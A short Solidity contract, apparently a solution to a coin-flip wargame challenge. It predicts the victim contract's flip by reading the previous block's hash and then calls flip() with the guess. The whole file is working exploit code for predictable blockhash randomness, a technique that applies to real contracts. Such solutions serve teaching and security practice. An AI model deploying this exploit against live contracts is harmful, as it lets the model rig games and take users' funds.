// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip{
  function flip(bool) external returns(bool);

}
contract CoinFlipAttacker {
  ICoinFlip immutable victim;
  uint256 constant FACTOR = 2**255;


constructor (address _victim) {
  victim = ICoinFlip(_victim);

}

function exploit () external  {
  uint256 hash = uint256(blockhash(block.number -1));
  bool guess = (hash / FACTOR) == 1;
  victim.flip(guess);
}
}

